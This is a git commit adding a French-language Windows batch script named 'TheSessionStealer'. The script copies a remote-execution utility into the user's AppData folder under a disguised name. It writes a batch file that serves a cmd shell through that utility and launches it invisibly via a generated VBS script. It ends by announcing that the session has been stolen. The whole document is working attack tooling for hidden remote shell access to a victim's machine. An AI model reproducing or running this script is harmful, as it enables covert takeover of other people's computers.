c4a113e5bd30f09d10d1568be09245c27c50d2b2
HDgaming5758 <56882138+HDgaming5758@users.noreply.github.com>
2020-05-03 12:06:51 +0200

    Add files via upload

---
+++ TheSessionStealer.bat
@@ -0,0 +1,56 @@
+@echo off
+set iver=1.0
+if %1% == -uc (
+	
+)
+type configuration.txt | bin\cut -d; -f1 | bin\cut -d= -f2>tmp
+set /p IF= < tmp && del /s tmp
+type configuration.txt | bin\cut -d; -f2 | bin\cut -d= -f2>tmp
+set /p wget= < tmp && del /s tmp
+cls
+title TheSessionStealer V 1.0
+echo.
+type logo.txt
+echo.
+echo Creation du fichier (%IF%) 
+mkdir %appdata%\%IF%
+echo. 
+echo "Injection de l’utilitaire (remote.exe) dans %appdata%\%IF%"
+copy bin\remote.exe %appdata%\%IF%\tss.exe > nul
+echo.
+if "%wget%"=="on" (
+	echo "Injection de l’utilitaire (wget.exe) et des dll dans %appdata%\%IF%"
+	copy bin\wget\*.* %appdata%\%IF%\ > nul
+	echo.
+)
+echo G,n,ration d'un point bat pour lancer un reverse shell
+echo.
+echo %appdata%\%IF%\tss.exe /s cmd SYSCMD> %appdata%\%IF%\BL.bat
+echo.
+echo G,n,ration d'un point vbs pour lancer un reverse shell en arrier plent
+echo Set oWShell = CreateObject("Wscript.Shell")> %appdata%\%IF%\LBI.vbs
+echo oWShell.Run """%appdata%\%IF%\BL.bat""", 0, False>> %appdata%\%IF%\LBI.vbs
+echo Set oWSHell = Nothing>> %appdata%\%IF%\LBI.vbs
+echo.
+echo Lancement du fichier vbs
+echo.
+call %appdata%\%IF%\LBI.vbs
+echo.
+echo Verification de la pr,sence de tout le fichier
+echo.
+set tsse=ok
+set BLe=ok
+set LBIe=ok
+if not exist %appdata%\%IF%\tss.exe set tsse=erreur
+if not exist %appdata%\%IF%\BL.bat set BLe=erreur
+if not exist %appdata%\%IF%\LBI.vbs set LBIe=erreur
+echo fichier (tss.exe) : %tsse%
+echo.
+echo fichier (BL.bat) : %BLe%
+echo.
+echo fichier (LBI.vbs) : %LBIe%
+echo.
+if %tsse% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
+if %BLe% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
+if %LBIe% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
+echo La session a ete d,rob,e !!, ne faite pas de betise
